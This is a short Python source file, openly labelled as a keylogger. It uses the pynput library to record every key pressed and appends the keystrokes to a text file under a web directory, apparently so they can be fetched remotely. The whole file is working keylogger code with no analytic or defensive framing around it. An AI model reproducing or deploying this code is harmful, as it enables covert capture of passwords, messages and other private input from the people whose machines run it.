import pynput
from pynput.keyboard import Key, Listener
# Keylogger functions
keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open('/home/window/web/black.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(' ')
            elif k == "Key.enter":
                f.write('\n')
            elif k == "Key.backspace":
                f.write('backspace')
            else:
                f.write(k)
    keys.clear()

def on_release(key):
    if key == Key.esc:
        return False

# Start keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
